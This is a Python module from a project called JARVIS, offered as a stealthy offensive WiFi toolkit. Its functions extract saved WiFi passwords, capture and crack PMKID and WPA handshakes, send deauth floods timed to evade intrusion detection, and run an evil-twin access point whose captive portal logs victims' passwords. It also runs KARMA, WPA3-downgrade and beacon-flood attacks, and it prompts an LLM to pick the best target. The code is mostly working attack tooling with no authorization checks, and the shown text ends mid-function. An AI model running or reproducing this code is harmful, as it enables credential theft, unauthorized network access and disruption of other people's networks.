# actions/off_wifi.py
# JARVIS Enhanced WiFi Agent — Cross-Platform, Modern, Stealthy

import subprocess
import os
import sys
import json
import time
import threading
import glob
import random
import string
import platform
import re
from pathlib import Path
from datetime import datetime

# ── OS Detection ──────────────────────────────────────────────────────────────
OS   = platform.system()   # Windows | Linux | Darwin
ARCH = platform.machine()

CAPTURE_DIR = Path.home() / "jarvis_captures" / "wifi"
CAPTURE_DIR.mkdir(parents=True, exist_ok=True)


# ── Base Dir (same pattern as main.py) ───────────────────────────────────────
def _get_base_dir() -> Path:
    if getattr(sys, "frozen", False):
        return Path(sys.executable).parent
    return Path(__file__).resolve().parent.parent


_BASE_DIR        = _get_base_dir()
_API_CONFIG_PATH = _BASE_DIR / "config" / "api_keys.json"


# ── Groq Key Loader (same pattern as main.py _get_api_key) ───────────────────
def _get_groq_key() -> str:
    # 1. Credential manager first
    try:
        from core.credential_manager import get_credential
        key = get_credential("groq", "api_key")
        if key:
            return key
    except Exception:
        pass
    # 2. api_keys.json fallback
    try:
        with open(_API_CONFIG_PATH, "r", encoding="utf-8") as f:
            return json.load(f).get("groq_api_key", "")
    except Exception:
        return ""


# ── Init Groq ─────────────────────────────────────────────────────────────────
try:
    from groq import Groq as _Groq
    _groq_key      = _get_groq_key()
    _groq_client   = _Groq(api_key=_groq_key) if _groq_key else None
    GROQ_AVAILABLE = _groq_client is not None
    if GROQ_AVAILABLE:
        print("[WiFi] ✅ Groq connected")
    else:
        print("[WiFi] ⚠️  Groq not available — add groq_api_key to config/api_keys.json")
except Exception as e:
    _groq_client   = None
    GROQ_AVAILABLE = False
    print(f"[WiFi] ❌ Groq init failed: {e}")

# ── Groq Model ────────────────────────────────────────────────────────────────
_GROQ_MODEL = "llama-3.3-70b-versatile"


def _ask_groq(prompt: str, context: str = "") -> str:
    """WiFi-specific Groq call."""
    if not GROQ_AVAILABLE or _groq_client is None:
        return "Groq not available — add groq_api_key to config/api_keys.json"
    try:
        msg = f"{context}\n\n{prompt}" if context else prompt
        r   = _groq_client.chat.completions.create(
            model    = _GROQ_MODEL,
            messages = [
                {
                    "role":    "system",
                    "content": (
                        "You are an expert offensive security WiFi analyst. "
                        "Give concise, technical, actionable attack recommendations. "
                        "Focus on modern 2024 techniques: PMKID, WPA3 downgrade, "
                        "KARMA attacks, evil twin with captive portal. "
                        "Be specific about commands and tools."
                    )
                },
                {"role": "user", "content": msg}
            ],
            max_tokens  = 1024,
            temperature = 0.3,
        )
        return r.choices[0].message.content.strip()
    except Exception as e:
        return f"Groq error: {e}"


# ══════════════════════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def _run(cmd: str, timeout: int = 30, shell: bool = True) -> dict:
    try:
        r = subprocess.run(
            cmd, shell=shell, capture_output=True,
            text=True, timeout=timeout
        )
        return {
            "stdout": r.stdout.strip(),
            "stderr": r.stderr.strip(),
            "code":   r.returncode
        }
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": "Timeout", "code": -1}
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "code": -1}


def _check_tool(tool: str) -> bool:
    if OS == "Windows":
        r = _run(f"where {tool} 2>nul")
    else:
        r = _run(f"which {tool} 2>/dev/null")
    return r["code"] == 0


def _check_root() -> bool:
    if OS == "Windows":
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False
    return os.geteuid() == 0


def _random_mac() -> str:
    """Generate a random locally administered MAC address."""
    mac    = [random.randint(0x00, 0xff) for _ in range(6)]
    mac[0] = (mac[0] & 0xfe) | 0x02
    return ":".join([f"{x:02x}" for x in mac])


def _save_report(name: str, content: str) -> str:
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = CAPTURE_DIR / f"{name}_{ts}.txt"
    path.write_text(content, encoding="utf-8", errors="ignore")
    return str(path)


# ══════════════════════════════════════════════════════════════════════════════
#  INTERFACE DETECTION — CROSS PLATFORM
# ══════════════════════════════════════════════════════════════════════════════

def get_interfaces() -> list:
    """Get wireless interfaces for any OS."""
    interfaces = []

    if OS == "Linux":
        r = _run("iw dev | grep Interface | awk '{print $2}'")
        if r["code"] == 0 and r["stdout"]:
            interfaces = [i.strip() for i in r["stdout"].splitlines() if i.strip()]
        if not interfaces:
            r2 = _run("iwconfig 2>/dev/null | grep -o '^[^ ]*'")
            interfaces = [
                i.strip() for i in r2["stdout"].splitlines()
                if i.strip() and i.strip() != "lo"
            ]

    elif OS == "Windows":
        r = _run("netsh wlan show interfaces")
        for line in r["stdout"].splitlines():
            if "Name" in line and ":" in line:
                name = line.split(":", 1)[-1].strip()
                if name:
                    interfaces.append(name)

    elif OS == "Darwin":
        r = _run("networksetup -listallhardwareports")
        lines = r["stdout"].splitlines()
        for i, line in enumerate(lines):
            if "Wi-Fi" in line or "AirPort" in line:
                for j in range(i, min(i + 3, len(lines))):
                    if "Device:" in lines[j]:
                        iface = lines[j].split(":")[-1].strip()
                        interfaces.append(iface)

    return interfaces or ["wlan0"]


# ══════════════════════════════════════════════════════════════════════════════
#  MAC RANDOMIZATION (STEALTH)
# ══════════════════════════════════════════════════════════════════════════════

def randomize_mac(interface: str = None) -> dict:
    """Randomize MAC address before any operation."""
    ifaces  = get_interfaces()
    iface   = interface or (ifaces[0] if ifaces else "wlan0")
    new_mac = _random_mac()

    if OS == "Linux":
        _run(f"ip link set {iface} down")
        r = _run(f"ip link set {iface} address {new_mac}")
        _run(f"ip link set {iface} up")
        if r["code"] != 0:
            _run(f"ip link set {iface} down")
            r = _run(f"macchanger -m {new_mac} {iface}")
            _run(f"ip link set {iface} up")
        success = r["code"] == 0

    elif OS == "Windows":
        r = _run(
            f'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Class\\'
            f'{{4D36E972-E325-11CE-BFC1-08002BE10318}}\\0001" '
            f'/v NetworkAddress /t REG_SZ '
            f'/d {new_mac.replace(":","").upper()} /f'
        )
        success = r["code"] == 0

    elif OS == "Darwin":
        r       = _run(f"sudo ifconfig {iface} ether {new_mac}")
        success = r["code"] == 0

    else:
        success = False

    return {
        "success":   success,
        "interface": iface,
        "new_mac":   new_mac,
        "message": (
            f"MAC randomized to {new_mac} on {iface}."
            if success else
            f"MAC randomization failed: {r.get('stderr', '')}"
        )
    }


# ══════════════════════════════════════════════════════════════════════════════
#  MONITOR MODE
# ══════════════════════════════════════════════════════════════════════════════

def enable_monitor_mode(interface: str = None) -> dict:
    """Enable monitor mode — Linux only."""
    if OS != "Linux":
        return {
            "success": False,
            "message": (
                f"Monitor mode not supported on {OS}. "
                f"Requires Linux with compatible wireless adapter."
            )
        }
    if not _check_root():
        return {"success": False, "message": "Root required for monitor mode."}

    ifaces = get_interfaces()
    iface  = interface or (ifaces[0] if ifaces else "wlan0")

    _run("airmon-ng check kill")
    time.sleep(1)

    r = _run(f"iw dev {iface} set type monitor")
    if r["code"] == 0:
        _run(f"ip link set {iface} up")
        mon_iface = iface
    else:
        r = _run(f"airmon-ng start {iface}")
        mon_iface = iface + "mon"
        check = _run("iw dev | grep Interface | awk '{print $2}'")
        for line in check["stdout"].splitlines():
            candidate = line.strip()
            if "mon" in candidate:
                mon_iface = candidate
                break

    return {
        "success":   True,
        "interface": mon_iface,
        "message":   f"Monitor mode enabled on {mon_iface}."
    }


def disable_monitor_mode(interface: str = None) -> dict:
    """Disable monitor mode and restore managed mode."""
    if OS != "Linux":
        return {"success": False, "message": f"Not supported on {OS}."}
    if not _check_root():
        return {"success": False, "message": "Root required."}

    ifaces = get_interfaces()
    mon    = [i for i in ifaces if "mon" in i]
    iface  = interface or (mon[0] if mon else "wlan0mon")

    _run(f"airmon-ng stop {iface}")
    _run(
        "systemctl restart NetworkManager 2>/dev/null || "
        "service network-manager restart 2>/dev/null || true"
    )

    return {
        "success": True,
        "message": "Monitor mode disabled. Network restored."
    }


# ══════════════════════════════════════════════════════════════════════════════
#  NETWORK SCANNING — CROSS PLATFORM
# ══════════════════════════════════════════════════════════════════════════════

def scan_networks(interface: str = None, duration: int = 15) -> dict:
    """Scan WiFi networks — adapts per OS."""
    networks = []

    if OS == "Linux":
        ifaces = get_interfaces()
        mon    = [i for i in ifaces if "mon" in i]
        iface  = interface or (
            mon[0] if mon else
            (ifaces[0] + "mon" if ifaces else "wlan0mon")
        )

        if _check_tool("airodump-ng"):
            out_prefix = str(CAPTURE_DIR / "scan")
            proc = subprocess.Popen(
                f"airodump-ng --output-format csv -w {out_prefix} {iface}",
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            time.sleep(duration)
            proc.terminate()
            time.sleep(1)

            csv_files = glob.glob(out_prefix + "*.csv")
            if csv_files:
                try:
                    with open(csv_files[-1], "r", errors="ignore") as f:
                        lines = f.readlines()
                    for line in lines[2:]:
                        parts = line.split(",")
                        if len(parts) > 13 and len(parts[0].strip()) == 17:
                            networks.append({
                                "bssid":   parts[0].strip(),
                                "channel": parts[3].strip(),
                                "power":   parts[8].strip(),
                                "enc":     parts[5].strip(),
                                "essid":   parts[13].strip(),
                            })
                except Exception:
                    pass

        else:
            r = _run(f"iwlist {iface} scan 2>/dev/null", timeout=30)
            current = {}
            for line in r["stdout"].splitlines():
                line = line.strip()
                if "Cell" in line and "Address:" in line:
                    if current:
                        networks.append(current)
                    current = {"bssid": line.split("Address:")[-1].strip()}
                elif "ESSID:" in line:
                    current["essid"] = (
                        line.split('"')[1] if '"' in line else ""
                    )
                elif "Channel:" in line:
                    current["channel"] = line.split(":")[-1].strip()
                elif "Encryption key:" in line:
                    current["enc"] = "WPA" if "on" in line else "OPN"
                elif "Signal level=" in line:
                    current["power"] = (
                        line.split("Signal level=")[-1].split()[0]
                    )
            if current:
                networks.append(current)

    elif OS == "Windows":
        r = _run("netsh wlan show networks mode=bssid", timeout=30)
        current = {}
        for line in r["stdout"].splitlines():
            line = line.strip()
            if line.startswith("SSID") and "BSSID" not in line:
                if current:
                    networks.append(current)
                current = {"essid": line.split(":", 1)[-1].strip()}
            elif "BSSID" in line:
                current["bssid"] = line.split(":", 1)[-1].strip()
            elif "Signal" in line:
                current["power"] = line.split(":", 1)[-1].strip()
            elif "Authentication" in line:
                current["enc"] = line.split(":", 1)[-1].strip()
            elif "Channel" in line:
                current["channel"] = line.split(":", 1)[-1].strip()
        if current:
            networks.append(current)

    elif OS == "Darwin":
        airport = (
            "/System/Library/PrivateFrameworks/Apple80211.framework"
            "/Versions/Current/Resources/airport"
        )
        r = _run(f"{airport} -s", timeout=20)
        for line in r["stdout"].splitlines()[1:]:
            parts = line.split()
            if len(parts) >= 7:
                networks.append({
                    "essid":   parts[0],
                    "bssid":   parts[1],
                    "power":   parts[2],
                    "channel": parts[3],
                    "enc":     parts[6] if len(parts) > 6 else "WPA2",
                })

    # Sort by signal strength
    try:
        networks.sort(
            key=lambda x: int(
                str(x.get("power", "0"))
                .replace("dBm", "").replace("%", "").strip() or "0"
            ),
            reverse=True
        )
    except Exception:
        pass

    summary = "\n".join([
        f"  [{n.get('essid', '?')}] "
        f"BSSID:{n.get('bssid', '?')} "
        f"CH:{n.get('channel', '?')} "
        f"PWR:{n.get('power', '?')} "
        f"ENC:{n.get('enc', '?')}"
        for n in networks[:20]
    ])

    # Ask Groq AI for best target
    ai_rec = ""
    if networks and GROQ_AVAILABLE:
        ai_rec = _ask_groq(
            "Based on these WiFi networks, which is the best target for "
            "a penetration test and why? What attack would you recommend?",
            context=summary
        )

    report = (
        f"WiFi Scan ({OS}) — {datetime.now()}\n\n"
        f"{summary}\n\nAI Recommendation:\n{ai_rec}"
    )
    path = _save_report("wifi_scan", report)

    return {
        "success":      True,
        "networks":     networks,
        "count":        len(networks),
        "ai_recommend": ai_rec,
        "report":       path,
        "message": (
            f"Found {len(networks)} networks:\n{summary}"
            + (f"\n\nAI: {ai_rec[:200]}" if ai_rec else "")
        )
    }


# ══════════════════════════════════════════════════════════════════════════════
#  SAVED PASSWORD EXTRACTION — CROSS PLATFORM
# ══════════════════════════════════════════════════════════════════════════════

def extract_saved_passwords() -> dict:
    """Extract saved WiFi passwords from the OS."""
    passwords = []

    if OS == "Windows":
        r        = _run("netsh wlan show profiles")
        profiles = []
        for line in r["stdout"].splitlines():
            if "All User Profile" in line:
                profiles.append(line.split(":")[-1].strip())
        for profile in profiles:
            r2 = _run(f'netsh wlan show profile name="{profile}" key=clear')
            for line in r2["stdout"].splitlines():
                if "Key Content" in line:
                    pwd = line.split(":", 1)[-1].strip()
                    passwords.append({"ssid": profile, "password": pwd})

    elif OS == "Darwin":
        plist = Path(
            "~/Library/Preferences/SystemConfiguration"
            "/com.apple.airport.preferences.plist"
        ).expanduser()
        if plist.exists():
            r2 = _run(f"plutil -p '{plist}'")
            current_ssid = None
            for line in r2["stdout"].splitlines():
                if "SSIDString" in line:
                    current_ssid = (
                        line.split('"')[-2] if '"' in line else None
                    )
                if current_ssid:
                    pw_r = _run(
                        f'security find-generic-password -D '
                        f'"AirPort network password" '
                        f'-a "{current_ssid}" -w 2>/dev/null'
                    )
                    if pw_r["code"] == 0 and pw_r["stdout"]:
                        passwords.append({
                            "ssid":     current_ssid,
                            "password": pw_r["stdout"]
                        })
                        current_ssid = None

    elif OS == "Linux":
        nm_dir = Path("/etc/NetworkManager/system-connections/")
        if nm_dir.exists():
            for conf in nm_dir.glob("*.nmconnection"):
                try:
                    content = conf.read_text(errors="ignore")
                    ssid = pwd = ""
                    for line in content.splitlines():
                        if line.startswith("ssid="):
                            ssid = line.split("=", 1)[-1]
                        if line.startswith("psk="):
                            pwd = line.split("=", 1)[-1]
                    if ssid and pwd:
                        passwords.append({"ssid": ssid, "password": pwd})
                except Exception:
                    pass

        wpa = Path("/etc/wpa_supplicant/wpa_supplicant.conf")
        if wpa.exists():
            content = wpa.read_text(errors="ignore")
            pairs   = re.findall(
                r'ssid="([^"]+)".*?psk="([^"]+)"',
                content, re.DOTALL
            )
            for ssid, pwd in pairs:
                passwords.append({"ssid": ssid, "password": pwd})

    report = "\n".join([
        f"  SSID: {p['ssid']} | Password: {p['password']}"
        for p in passwords
    ])
    path = _save_report(
        "saved_wifi_passwords", report or "No passwords found"
    )

    return {
        "success":   True,
        "passwords": passwords,
        "count":     len(passwords),
        "report":    path,
        "message": (
            f"Extracted {len(passwords)} saved WiFi passwords:\n{report}"
            if passwords else
            "No saved WiFi passwords found."
        )
    }


# ══════════════════════════════════════════════════════════════════════════════
#  PMKID ATTACK (Modern — No Handshake Needed)
# ══════════════════════════════════════════════════════════════════════════════

def pmkid_attack(
    bssid:     str,
    interface: str = None,
    wordlist:  str = "/usr/share/wordlists/rockyou.txt",
    timeout:   int = 30
) -> dict:
    """PMKID Attack — Modern WPA2 attack, no client deauth needed."""
    if OS != "Linux":
        return {
            "success": False,
            "message": f"PMKID attack requires Linux. Current OS: {OS}"
        }
    if not _check_root():
        return {"success": False, "message": "Root required."}
    if not _check_tool("hcxdumptool"):
        return {
            "success": False,
            "message": "hcxdumptool not found. Install: apt install hcxdumptool"
        }

    ifaces   = get_interfaces()
    iface    = interface or (ifaces[0] if ifaces else "wlan0")
    out_pcap = str(CAPTURE_DIR / f"pmkid_{bssid.replace(':','')}.pcapng")
    out_hash = str(CAPTURE_DIR / f"pmkid_{bssid.replace(':','')}.hash")

    # Step 1: Capture PMKID
    proc = subprocess.Popen(
        f"hcxdumptool -i {iface} --filterlist_ap={bssid} "
        f"--filtermode=2 -o {out_pcap} --enable_status=1",
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    time.sleep(timeout)
    proc.terminate()
    time.sleep(1)

    if not Path(out_pcap).exists():
        return {"success": False, "message": "PMKID capture failed."}

    # Step 2: Convert
    _run(f"hcxpcapngtool -o {out_hash} {out_pcap}", timeout=30)
    if not Path(out_hash).exists():
        return {
            "success": False,
            "message": "PMKID conversion failed — AP may not support PMKID."
        }

    hash_content = Path(out_hash).read_text().strip()
    if not hash_content:
        return {
            "success": False,
            "message": "No PMKID captured. AP may not be vulnerable."
        }

    # Step 3: Crack
    result_file = str(
        CAPTURE_DIR / f"pmkid_{bssid.replace(':','')}_cracked.txt"
    )
    _run(
        f"hashcat -m 22000 {out_hash} {wordlist} "
        f"--outfile={result_file} --quiet --force",
        timeout=300
    )

    cracked_pwd = None
    if Path(result_file).exists():
        content = Path(result_file).read_text().strip()
        if content:
            cracked_pwd = content.split(":")[-1].strip()

    return {
        "success":  True,
        "bssid":    bssid,
        "cracked":  cracked_pwd is not None,
        "password": cracked_pwd,
        "hash_file": out_hash,
        "message": (
            f"PMKID password found: {cracked_pwd}"
            if cracked_pwd else
            f"PMKID captured but not cracked. Hash: {out_hash}"
        )
    }


# ══════════════════════════════════════════════════════════════════════════════
#  HANDSHAKE CAPTURE + CRACK
# ══════════════════════════════════════════════════════════════════════════════

def capture_handshake(
    bssid:     str,
    channel:   str,
    interface: str = None,
    duration:  int = 60,
    essid:     str = ""
) -> dict:
    """Capture WPA handshake with automatic deauth."""
    if OS != "Linux":
        return {"success": False, "message": "Requires Linux + monitor mode."}
    if not _check_root():
        return {"success": False, "message": "Root required."}

    ifaces     = get_interfaces()
    mon        = [i for i in ifaces if "mon" in i]
    iface      = interface or (mon[0] if mon else "wlan0mon")
    safe       = (essid or bssid).replace(":", "").replace(" ", "_")
    cap_prefix = str(CAPTURE_DIR / f"hs_{safe}")

    _run(f"iwconfig {iface} channel {channel}")

    proc = subprocess.Popen(
        f"airodump-ng --bssid {bssid} -c {channel} -w {cap_prefix} {iface}",
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    # Multiple deauth bursts
    for _ in range(3):
        time.sleep(5)
        _run(f"aireplay-ng --deauth 15 -a {bssid} {iface}")

    time.sleep(duration)
    proc.terminate()

    cap_files = glob.glob(cap_prefix + "*.cap")
    if not cap_files:
        return {"success": False, "message": "No capture file created."}

    cap_file = cap_files[-1]

    # Convert for hashcat
    hccapx = cap_file.replace(".cap", ".hccapx")
    _run(
        f"cap2hccapx {cap_file} {hccapx} 2>/dev/null || "
        f"hcxpcapngtool -o {hccapx} {cap_file} 2>/dev/null"
    )

    verify = _run(f"aircrack-ng {cap_file} 2>&1 | grep -i handshake")
    has_hs = "handshake" in verify["stdout"].lower()

    return {
        "success":   True,
        "handshake": has_hs,
        "cap_file":  cap_file,
        "hccapx":    hccapx if Path(hccapx).exists() else None,
        "message": (
            f"Handshake {'CAPTURED' if has_hs else 'not captured yet'}. "
            f"File: {cap_file}"
        )
    }


def crack_handshake(
    cap_file:  str,
    wordlist:  str  = "/usr/share/wordlists/rockyou.txt",
    bssid:     str  = None,
    use_rules: bool = True
) -> dict:
    """Crack WPA handshake using hashcat (GPU) then aircrack-ng (CPU)."""
    if not Path(cap_file).exists():
        return {"success": False, "message": f"File not found: {cap_file}"}

    result_file = cap_file.replace(".cap", "_cracked.txt").replace(
        ".hccapx", "_cracked.txt"
    )

    # Hashcat first (GPU — much faster)
    if _check_tool("hashcat"):
        hccapx = cap_file if cap_file.endswith(".hccapx") else \
                 cap_file.replace(".cap", ".hccapx")
        if Path(hccapx).exists():
            rules = (
                "-r /usr/share/hashcat/rules/best64.rule"
                if use_rules else ""
            )
            _run(
                f"hashcat -m 2500 {hccapx} {wordlist} {rules} "
                f"--outfile={result_file} --quiet --force",
                timeout=600
            )
            if Path(result_file).exists():
                content = Path(result_file).read_text().strip()
                if content:
                    pwd = content.split(":")[-1].strip()
                    return {
                        "success":  True,
                        "cracked":  True,
                        "password": pwd,
                        "method":   "hashcat GPU",
                        "message":  f"Password cracked (hashcat): {pwd}"
                    }

    # Fallback: aircrack-ng (CPU)
    cmd = f"aircrack-ng -w {wordlist} {cap_file}"
    if bssid:
        cmd += f" -b {bssid}"
    r = _run(cmd, timeout=300)
    for line in r["stdout"].splitlines():
        if "KEY FOUND" in line.upper():
            pwd = line.split(":")[-1].strip().strip("[]")
            return {
                "success":  True,
                "cracked":  True,
                "password": pwd,
                "method":   "aircrack-ng CPU",
                "message":  f"Password cracked (aircrack): {pwd}"
            }

    return {
        "success": True,
        "cracked": False,
        "message": "Password not found in wordlist."
    }


# ══════════════════════════════════════════════════════════════════════════════
#  DEAUTH ATTACK
# ══════════════════════════════════════════════════════════════════════════════

def deauth_attack(
    bssid:      str,
    client:     str  = "FF:FF:FF:FF:FF:FF",
    interface:  str  = None,
    count:      int  = 50,
    continuous: bool = False,
    randomize:  bool = True
) -> dict:
    """Deauth attack with timing randomization to avoid IDS."""
    if OS != "Linux":
        return {"success": False, "message": "Deauth requires Linux + monitor mode."}
    if not _check_root():
        return {"success": False, "message": "Root required."}

    ifaces = get_interfaces()
    mon    = [i for i in ifaces if "mon" in i]
    iface  = interface or (mon[0] if mon else "wlan0mon")

    if randomize:
        time.sleep(random.uniform(0.5, 2.0))

    if continuous:
        proc = subprocess.Popen(
            f"aireplay-ng --deauth 0 -a {bssid} -c {client} {iface}",
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return {
            "success": True,
            "pid":     proc.pid,
            "message": f"Continuous deauth on {bssid} (PID {proc.pid})"
        }

    # Burst mode with random delays
    sent       = 0
    burst_size = 10
    for _ in range(0, count, burst_size):
        _run(
            f"aireplay-ng --deauth {burst_size} -a {bssid} -c {client} {iface}",
            timeout=30
        )
        sent += burst_size
        if randomize:
            time.sleep(random.uniform(0.2, 1.5))

    return {
        "success": True,
        "message": f"Sent {sent} deauth packets to {bssid} → {client}."
    }


# ══════════════════════════════════════════════════════════════════════════════
#  EVIL TWIN + CAPTIVE PORTAL
# ══════════════════════════════════════════════════════════════════════════════

def evil_twin_with_portal(
    essid:     str,
    interface: str  = None,
    channel:   str  = "6",
    bssid:     str  = None,
    portal:    bool = True
) -> dict:
    """Modern Evil Twin with captive portal credential harvesting."""
    if OS != "Linux":
        return {"success": False, "message": "Evil Twin requires Linux."}
    if not _check_root():
        return {"success": False, "message": "Root required."}

    ifaces = get_interfaces()
    mon    = [i for i in ifaces if "mon" in i]
    iface  = interface or (mon[0] if mon else "wlan0mon")

    # Randomize MAC first
    randomize_mac(iface)

    # hostapd config
    cfg_path = "/tmp/jarvis_et.conf"
    cfg = (
        f"interface={iface}\n"
        f"driver=nl80211\n"
        f"ssid={essid}\n"
        f"hw_mode=g\n"
        f"channel={channel}\n"
        f"macaddr_acl=0\n"
        f"ignore_broadcast_ssid=0\n"
        f"wmm_enabled=0\n"
    )
    if bssid:
        cfg += f"bssid={bssid}\n"
    Path(cfg_path).write_text(cfg)

    # Captive portal HTML
    portal_dir  = Path("/tmp/jarvis_portal")
    portal_dir.mkdir(exist_ok=True)
    creds_file  = str(CAPTURE_DIR / "portal_creds.txt")

    portal_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>WiFi Authentication</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {{
            font-family: Arial; background: #f0f0f0;
            display: flex; justify-content: center;
            align-items: center; height: 100vh; margin: 0;
        }}
        .box {{
            background: white; padding: 40px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2); width: 320px;
        }}
        h2 {{ text-align: center; color: #333; }}
        input {{
            width: 100%; padding: 12px; margin: 8px 0;
            border: 1px solid #ddd; border-radius: 5px;
            box-sizing: border-box;
        }}
        button {{
            width: 100%; padding: 12px; background: #0078d4;
            color: white; border: none; border-radius: 5px;
            cursor: pointer; font-size: 15px;
        }}
        .logo {{ text-align: center; font-size: 40px; margin-bottom: 20px; }}
    </style>
</head>
<body>
<div class="box">
    <div class="logo">&#128246;</div>
    <h2>WiFi Login</h2>
    <p style="text-align:center;color:#666">
        Enter your WiFi password to continue
    </p>
    <form method="POST" action="/login">
        <input type="text" name="ssid" value="{essid}" readonly>
        <input type="password" name="password"
               placeholder="WiFi Password" required>
        <button type="submit">Connect</button>
    </form>
</div>
</body>
</html>"""
    (portal_dir / "index.html").write_text(portal_html)

    # Portal server
    server_script = f"""
import http.server
import urllib.parse
from pathlib import Path
from datetime import datetime

LOG_FILE = Path("{creds_file}")


class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        html = Path("{str(portal_dir / 'index.html')}").read_text()
        self.wfile.write(html.encode())

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body   = self.rfile.read(length).decode()
        params = urllib.parse.parse_qs(body)
        ssid   = params.get('ssid',     [''])[0]
        pwd    = params.get('password', [''])[0]
        with open(LOG_FILE, 'a') as f:
            f.write(
                f"[{{datetime.now()}}] "
                f"SSID: {{ssid}} | Password: {{pwd}} | "
                f"IP: {{self.client_address[0]}}\\n"
            )
        print(f"[+] CAPTURED: SSID={{ssid}} PWD={{pwd}}")
        self.send_response(302)
        self.send_header('Location', 'http://www.google.com')
        self.end_headers()


server = http.server.HTTPServer(('0.0.0.0', 80), Handler)
print("[*] Captive portal running on port 80")
server.serve_forever()
"""
    server_path = Path("/tmp/jarvis_portal_server.py")
    server_path.write_text(server_script)

    # Start processes
    hostapd_proc = subprocess.Popen(
        f"hostapd {cfg_path}",
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    time.sleep(2)

    dnsmasq_proc = subprocess.Popen(
        f"dnsmasq --no-daemon --interface={iface} "
        f"--dhcp-range=192.168.0.10,192.168.0.100,12h "
        f"--dhcp-option=3,192.168.0.1 "
        f"--dhcp-option=6,192.168.0.1 "
        f"--address=/#/192.168.0.1",
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    portal_proc = None
    if portal:
        portal_proc = subprocess.Popen(
            f"python3 {server_path}",
            shell=True
        )

    return {
        "success":      True,
        "essid":        essid,
        "channel":      channel,
        "hostapd_pid":  hostapd_proc.pid,
        "dnsmasq_pid":  dnsmasq_proc.pid,
        "portal_pid":   portal_proc.pid if portal_proc else None,
        "creds_file":   creds_file,
        "message": (
            f"Evil Twin '{essid}' running on ch{channel}.\n"
            f"Captive portal active.\n"
            f"Credentials → {creds_file}"
        )
    }


# ══════════════════════════════════════════════════════════════════════════════
#  KARMA ATTACK
# ══════════════════════════════════════════════════════════════════════════════

def karma_attack(interface: str = None) -> dict:
    """KARMA — respond to ALL WiFi probe requests."""
    if OS != "Linux":
        return {"success": False, "message": "KARMA requires Linux."}
    if not _check_root():
        return {"success": False, "message": "Root required."}

    ifaces = get_interfaces()
    iface  = interface or (ifaces[0] if ifaces else "wlan0")

    if _check_tool("bettercap"):
        caplet = f"""
set wifi.interface {iface}
wifi.recon on
set wifi.ap.ssid ""
set wifi.ap.karma true
wifi.ap on
"""
        cap_file = Path("/tmp/jarvis_karma.cap")
        cap_file.write_text(caplet)
        proc = subprocess.Popen(
            f"bettercap -caplet {cap_file}",
            shell=True
        )
        return {
            "success": True,
            "pid":     proc.pid,
            "message": (
                f"KARMA attack running via bettercap (PID {proc.pid}). "
                f"Responding to all WiFi probes."
            )
        }

    if _check_tool("hostapd-wpe"):
        cfg = f"""
interface={iface}
driver=nl80211
ssid=KARMA
channel=1
karma=1
"""
        cfg_path = Path("/tmp/jarvis_karma_hostapd.conf")
        cfg_path.write_text(cfg)
        proc = subprocess.Popen(
            f"hostapd-wpe {cfg_path}",
            shell=True
        )
        return {
            "success": True,
            "pid":     proc.pid,
            "message": f"KARMA attack via hostapd-wpe (PID {proc.pid})."
        }

    return {
        "success": False,
        "message": (
            "bettercap or hostapd-wpe required.\n"
            "Install: apt install bettercap"
        )
    }


# ══════════════════════════════════════════════════════════════════════════════
#  WPA3 DOWNGRADE
# ══════════════════════════════════════════════════════════════════════════════

def wpa3_downgrade(
    bssid:     str,
    interface: str = None,
    channel:   str = "6"
) -> dict:
    """Force WPA3 clients to connect via WPA2."""
    if OS != "Linux":
        return {"success": False, "message": "Requires Linux."}

    ifaces = get_interfaces()
    mon    = [i for i in ifaces if "mon" in i]
    iface  = interface or (mon[0] if mon else "wlan0mon")

    deauth_proc = subprocess.Popen(
        f"aireplay-ng --deauth 0 -a {bssid} {iface}",
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    cfg = f"""
interface={iface}
driver=nl80211
ssid=TargetNetwork
bssid={bssid}
channel={channel}
hw_mode=g
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=placeholder
"""
    cfg_path = Path("/tmp/jarvis_wpa3dg.conf")
    cfg_path.write_text(cfg)
    ap_proc = subprocess.Popen(
        f"hostapd {cfg_path}",
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    return {
        "success":    True,
        "deauth_pid": deauth_proc.pid,
        "ap_pid":     ap_proc.pid,
        "message": (
            f"WPA3 downgrade active on {bssid}. "
            f"WPA3 clients will be forced to WPA2."
        )
    }


# ══════════════════════════════════════════════════════════════════════════════
#  BEACON FLOOD
# ══════════════════════════════════════════════════════════════════════════════

def beacon_flood(interface: str = None) -> dict:
    """Flood area with fake beacon frames."""
    if OS != "Linux":
        return {"success": False, "message": "Requires Linux."}

    ifaces = get_interfaces()
    mon    = [i for i in ifaces if "mon" in i]
    iface  = interface or (mon[0] if mon else "wlan0mon")

    tool = "mdk4" if _check_tool("mdk4") else (
        "mdk3" if _check_tool("mdk3") else None
    )
    if not tool:
        return {
            "success": False,
            "message": "mdk4 or mdk3 required. Install: apt install mdk4"
        }

    proc = subprocess.Popen(
        f"{tool} {iface} b -g -f /dev/urandom",
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    return {
        "success": True,
        "pid":     proc.pid,
